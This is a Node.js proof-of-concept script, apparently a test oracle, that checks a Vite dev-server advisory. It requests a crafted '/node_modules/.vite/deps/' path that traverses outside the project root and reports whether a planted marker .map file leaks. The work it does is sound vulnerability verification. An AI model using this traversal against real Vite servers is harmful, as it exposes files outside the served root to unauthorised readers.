const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';
  let server;

  try {
    const vite = require('vite');

    const marker = 'vite-ghsa-4w7w-66w2-5vf9-' + process.pid + '-' + Date.now();
    const base = path.join(os.tmpdir(), marker);
    const root = path.join(base, 'project');
    const srcDir = path.join(root, 'src');
    const outsideMap = path.join(base, 'outside-secret.map');

    fs.mkdirSync(srcDir, { recursive: true });
    fs.writeFileSync(path.join(root, 'index.html'), '<!doctype html><html><body><script type="module" src="/src/main.js"></script></body></html>');
    fs.writeFileSync(path.join(srcDir, 'main.js'), 'export const ok = 1; console.log(ok);');
    fs.writeFileSync(outsideMap, JSON.stringify({ version: 3, file: 'x.js', marker: marker, sources: [], names: [], mappings: '' }));

    server = await vite.createServer({
      root,
      appType: 'spa',
      logLevel: 'silent',
      server: {
        host: true,
        port: 0,
        fs: { strict: true }
      }
    });

    await server.listen();

    // Benign operation: ensure the same public operation path works for a normal source file request.
    const benign = await server.transformRequest('/src/main.js');
    if (!benign || typeof benign.code !== 'string' || benign.code.indexOf('ok = 1') === -1) {
      throw new Error('benign transformRequest did not return expected module output');
    }

    operation_completed = true;

    const escaped = path.relative(root, outsideMap).split(path.sep).join('/');
    const maliciousUrl = '/node_modules/.vite/deps/' + escaped;

    try {
      const res = await server.transformRequest(maliciousUrl);
      const code = res && typeof res.code === 'string' ? res.code : '';
      if (code.includes(marker)) {
        exploit_succeeded = true;
        evidence = 'marker leaked from out-of-root .map via optimized deps path';
      } else {
        exploit_succeeded = false;
        evidence = 'no out-of-root marker in response';
      }
    } catch (err) {
      exploit_succeeded = false;
      evidence = 'malicious request rejected';
    }
  } catch (e) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup/benign failure: ' + (e && e.message ? e.message : String(e));
  } finally {
    if (server) {
      try { await server.close(); } catch (_) {}
    }
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();